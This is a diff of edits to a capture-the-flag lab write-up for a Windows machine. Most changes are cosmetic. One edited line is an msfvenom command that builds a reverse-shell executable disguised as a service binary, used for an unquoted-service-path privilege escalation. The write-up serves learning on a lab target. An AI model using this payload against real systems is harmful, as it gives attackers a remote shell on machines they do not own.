@@ -2,7 +2,7 @@
 
 ##### Written: 10/09/2020
 
-#### IP Address: 10.10.213.55
+##### IP Address: 10.10.213.55
 
 <br>
 
@@ -90,7 +90,7 @@ I then ran the exploit, which gave the following results:
 
 <img style="float: left;" src="screenshots/screenshot8.png">
 
-Looks like I'm in! :smile:
+Looks like I'm in!
 
 <br>
 
@@ -151,7 +151,7 @@ Hence, the name of the unquoted service path name is **AdvancedSystemCareService
 First, we use **msfvenom** to generate the reverse_shell payload as a windows executable file. This can be done with the following command.
 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=10.4.6.205 LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP_HERE> LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe
 ```
 
 <img style="float: left;" src="screenshots/screenshot16.png">
@@ -236,7 +236,7 @@ With these all set up, we can run the exploit script!
 
 <img style="float: left;" src="screenshots/screenshot28.png">
 
-Aaaaand we're in!
+And we're in!
 
 <br>
 
@@ -246,11 +246,11 @@ We first navigate over to bill's desktop. Now, we can host another python http s
 
 <img style="float: left;" src="screenshots/screenshot29.png">
 
+<br>
+
 Now, we can just run the file and see what results we get!
 
 <img style="float: left;" src="screenshots/screenshot30.png">
-
-<br>
 
 <br>
 
